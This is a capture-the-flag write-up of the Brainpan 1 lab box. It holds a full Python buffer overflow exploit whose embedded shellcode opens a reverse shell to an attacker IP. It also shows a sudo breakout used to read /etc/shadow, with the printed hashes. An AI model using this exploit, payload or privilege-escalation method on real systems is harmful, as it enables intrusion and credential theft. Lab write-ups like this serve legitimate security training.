# Brainpan 1
## Recon

The only thing I know about this challenge is there is a buffer overflow involved.

## Scanning

```bash
PORT      STATE SERVICE REASON         VERSION                                                                 
9999/tcp  open  abyss?  syn-ack ttl 61                                                                         
| fingerprint-strings:                                                                                         
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|  
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 61 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
```

## Enumeration

Port `9999` is some console. I did a few password guesses but nothing stuck. Port `10000` is running a webserver which has a slightly outdated infographic about secure coding. Dirbuster found a `/bin/` directory on the webserver. There's one executable file hosted there: `brainpan.exe`. This much be the service behind port 9999. I'll copy it away for exploit development in my lab. The box says to do the work in linux, but why? I already can do it repetedly in Windows. Maybe someday I'll learn the finer points of linux debuggers, but for now I'll do it the way I already know how.

## Exploit development.

I got the service running in my lab and verified the port with nmap. The output for port 9999 matched the initial scan exactly!

The buffer overflow script I wrote only identified `\x00` as a badchar. Additionally the exploit is failing.

The exploit was failing because of a bug in the script. Working now.

I swapped out some variables and made the exploit ready for brainpan. Here is the final result:

```python3
#!/usr/bin/env python3

import socket

ip = "10.10.109.180"
port = 9999

prefix = " "
offset = 523
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
payload = "\xda\xc4\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\xbb\xad\xfc\xa8\x8e\x31\x58\x17\x83\xe8\xfc\x03\xf5\xef\x4a\x7b\xf9\xf8\x09\x84\x01\xf9\x6d\x0c\xe4\xc8\xad\x6a\x6d\x7a\x1e\xf8\x23\x77\xd5\xac\xd7\x0c\x9b\x78\xd8\xa5\x16\x5f\xd7\x36\x0a\xa3\x76\xb5\x51\xf0\x58\x84\x99\x05\x99\xc1\xc4\xe4\xcb\x9a\x83\x5b\xfb\xaf\xde\x67\x70\xe3\xcf\xef\x65\xb4\xee\xde\x38\xce\xa8\xc0\xbb\x03\xc1\x48\xa3\x40\xec\x03\x58\xb2\x9a\x95\x88\x8a\x63\x39\xf5\x22\x96\x43\x32\x84\x49\x36\x4a\xf6\xf4\x41\x89\x84\x22\xc7\x09\x2e\xa0\x7f\xf5\xce\x65\x19\x7e\xdc\xc2\x6d\xd8\xc1\xd5\xa2\x53\xfd\x5e\x45\xb3\x77\x24\x62\x17\xd3\xfe\x0b\x0e\xb9\x51\x33\x50\x62\x0d\x91\x1b\x8f\x5a\xa8\x46\xd8\xaf\x81\x78\x18\xb8\x92\x0b\x2a\x67\x09\x83\x06\xe0\x97\x54\x68\xdb\x60\xca\x97\xe4\x90\xc3\x53\xb0\xc0\x7b\x75\xb9\x8a\x7b\x7a\x6c\x1c\x2b\xd4\xdf\xdd\x9b\x94\x8f\xb5\xf1\x1a\xef\xa6\xfa\xf0\x98\x4d\x01\x93\xac\x93\x40\xba\xd9\x91\x52\x2d\x46\x1f\xb4\x27\x66\x49\x6f\xd0\x1f\xd0\xfb\x41\xdf\xce\x86\x42\x6b\xfd\x77\x0c\x9c\x88\x6b\xf9\x6c\xc7\xd1\xac\x73\xfd\x7d\x32\xe1\x9a\x7d\x3d\x1a\x35\x2a\x6a\xec\x4c\xbe\x86\x57\xe7\xdc\x5a\x01\xc0\x64\x81\xf2\xcf\x65\x44\x4e\xf4\x75\x90\x4f\xb0\x21\x4c\x06\x6e\x9f\x2a\xf0\xc0\x49\xe5\xaf\x8a\x1d\x70\x9c\x0c\x5b\x7d\xc9\xfa\x83\xcc\xa4\xba\xbc\xe1\x20\x4b\xc5\x1f\xd1\xb4\x1c\xa4\xf1\x56\xb4\xd1\x99\xce\x5d\x58\xc4\xf0\x88\x9f\xf1\x72\x38\x60\x06\x6a\x49\x65\x42\x2c\xa2\x17\xdb\xd9\xc4\x84\xdc\xcb;"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
```

I get a shell. But not a very good one. I was able to get a somewhat normal shell by executing `/bin/bash` and the python pty.spawn trick.

```python3
python3 -c "import pty; pty.spawn('/bin/bash');"
```

The shell was still pretty unstable and unpredictable, so I ran linpeas and downloaded the output for review.

### LinPEAS findings

> OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc
 version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25
 19:02:34 UTC 2013

> Sudo 1.8.5p2

> PROCESSOR_ARCHITECTURE=x86

>  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
>  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
>  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
>  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
>  [5] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
>  [6] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346

The output is messy, but it appears cron is running and the standard crontab file has an entry that starts chksrv.sh (the script that starts brainpan.exe).

> # m h  dom mon dow   command
> * * * * * /home/puck/checksrv.sh


> User puck may run the following commands on this host:
>    (root) NOPASSWD: /home/anansi/bin/anansi_util

> ╔══════════╣ .sh files in path
> ╚ https://book.hacktricks.xyz/linux-unix/privilege-esca
> lation#script-binaries-in-path
> /usr/bin/gettext.sh

I was investigating the crontab file to see if I could gain execution somehow. I don't have write access to crontab, or the script it calls...but wait. The brainpan executable was in my users's home directory. Maybe have write permissions to it.

I started playing with `anansi_util` since I was able to run it as sudo. Using GTFO bins I was able to find a few different breakout methods for the manual command.

I was able to read `/etc/shadow`

```bash
Z:\home\puck>sudo /home/anansi/bin/anansi_util manual /etc/shadowi

root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO‐hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa‐Dioh0:15768:0:99999:7:::              

reynard:$6$h54J.qxd$yL5md3J4dON‐wNl.36iA.mkcabQqRMmeZ0VFKxIVpX‐eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::

anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv‐Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly‐DGIPE1:15768:0:99999:7:::

puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm‐bIcBF9Oi7q2eAi0TMMqO‐hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::
```


